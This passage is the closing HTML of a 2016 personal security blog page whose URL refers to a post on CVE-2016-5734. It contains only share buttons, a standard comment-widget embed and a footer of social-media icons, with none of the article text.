        </a>
    </li>
    <li>
        <!-- google share button -->
        <div class="g-plusone"
             data-href="https://kosukeshimofuji.jp/2016/07/19/CVE-2016-5734/"></div>
    </li>
    <li>
        <!-- pocket share button -->
        <a data-pocket-label="pocket" data-pocket-count="horizontal" class="pocket-btn" data-lang="en"></a>
    </li>
</ul>


  <br>
  <div id="disqus_thread"></div>
<script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */
    /*
    var disqus_config = function () {
        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */
    (function() {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');
        
        s.src = '//kosukesimofuji-hp.disqus.com/embed.js';
        
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>


</article>

      </div>
    </div>

    <footer class="site-footer">
  <div class="site-footer-wrapper">
    <div id="footer-description">Think about cyber warfare, business warfare.
</div>
    <br>
    <a href="mailto:kosuke.shimofuji@gmail.com"><?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" overflow="scroll" xml:space="preserve">
<path fill="#231F20" d="M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M19.188,72.951V72.85
	l24.708-23.145l6.103,5.597l5.967-5.472l24.682,23.121H19.188z M80.81,70.861l-23.635-22.14L80.81,27.048L49.999,50L19.188,27.048
	l23.499,21.547L19.188,70.609V27.048H80.81V70.861z"/>
</svg>
</a>
    <a href="/feed.xml"><?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" overflow="visible" xml:space="preserve">
<path fill="#231F20" d="M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M35.379,70.782h-0.02
	c-3.111,0-5.646-2.531-5.658-5.641c-0.002-3.119,2.529-5.668,5.646-5.68c3.133,0,5.669,2.529,5.673,5.641
	C41.03,68.221,38.502,70.768,35.379,70.782z M51.874,70.718c-0.401-11.855-9.782-20.759-22.214-21.064l-0.02-7.672
	c16.59,0.357,29.486,12.781,29.916,28.711L51.874,70.718z M67.979,70.658c-0.446-20.681-17.11-36.818-38.362-37.105l-0.021-7.674
	C55.152,26.154,75.201,45.65,75.66,70.625L67.979,70.658z"/>
</svg>
</a>
    <a href="https://github.com/KosukeShimofuji"><?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" xml:space="preserve">
<path fill="#231F20" d="M50.141,61.976c3.769,0,6.824,1.903,6.824,4.251s-3.055,4.251-6.824,4.251s-6.824-1.903-6.824-4.251
	S46.372,61.976,50.141,61.976z M49.23,29.299c2.584,0,4.678,2.632,4.678,5.878s-2.094,5.878-4.678,5.878s-4.678-2.632-4.678-5.878
	S46.646,29.299,49.23,29.299z M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M62.501,35.182
	c0,7.247-5.84,13.135-13.098,13.278c-1.916,3.813-0.003,5.578,1.468,6.328c0,0,0.298,0.151,0.95,0.388
	c0.239,0.076,0.391,0.107,0.391,0.107s-0.002,0.011-0.003,0.03c0.457,0.155,1.04,0.338,1.76,0.534
	c0.876,0.146,1.723,0.347,2.533,0.601c0.003,0,0.008,0.002,0.013,0.003c0,0,0.013,0.003,0.017,0.006
	c1.336,0.421,2.569,0.983,3.664,1.659c0.451,0.259,0.86,0.529,1.16,0.798l0.002,0.002c2.335,1.799,3.819,4.205,3.981,6.916
	c0.364,6.147-6.211,11.533-14.684,12.029C42.18,78.357,35.016,73.777,34.65,67.63c-0.257-4.348,2.959-8.313,7.859-10.438
	c-5.216-4.507-2.277-8.819-0.432-10.731c-3.786-2.345-6.308-6.519-6.308-11.279c0-7.337,5.984-13.284,13.365-13.284
	c2.213,0,4.297,0.537,6.134,1.483c0,0,3.796,1.554,10.098-1.483v8.16h0.002c0,0-1.893,0.859-3.395,1.421
	C62.314,32.655,62.501,33.897,62.501,35.182z"/>
</svg>

</a>
    <a href="https://twitter.com/KosukeShimofuji"><?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 17.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1 Tiny//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11-tiny.dtd">
<svg version="1.1" baseProfile="tiny" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
	 x="0px" y="0px" width="30px" height="30px" viewBox="0 0 100 100" xml:space="preserve">
<path fill="#231F20" d="M50,0C22.386,0,0,22.386,0,50s22.386,50,50,50s50-22.386,50-50S77.614,0,50,0z M76.666,38.556
	c0.023,0.547,0.037,1.096,0.037,1.646c0,16.818-12.801,36.211-36.211,36.211c-7.188,0-13.877-2.106-19.51-5.717
	c0.996,0.116,2.01,0.177,3.037,0.177c5.963,0,11.449-2.034,15.807-5.448c-5.57-0.102-10.271-3.782-11.891-8.838
	c0.777,0.148,1.574,0.229,2.395,0.229c1.162,0,2.285-0.156,3.354-0.447C27.862,55.2,23.475,50.056,23.475,43.89
	c0-0.053,0-0.106,0-0.16c1.717,0.954,3.68,1.526,5.766,1.593c-3.416-2.282-5.662-6.178-5.662-10.594c0-2.332,0.627-4.52,1.723-6.398
	c6.277,7.699,15.656,12.768,26.234,13.299c-0.219-0.933-0.332-1.904-0.332-2.901C51.203,31.698,56.904,26,63.932,26
	c3.66,0,6.969,1.545,9.289,4.02c2.9-0.571,5.623-1.63,8.082-3.089c-0.949,2.972-2.969,5.467-5.596,7.041
	c2.574-0.308,5.027-0.992,7.309-2.004C81.311,34.52,79.152,36.762,76.666,38.556z"/>
</svg>
</a>
    <br><br>
    <div id="footer-copyright">&copy; 2016 Kosuke Shimofuji. All rights reserved.</div>
  </div>
</footer>


  </body>

</html>
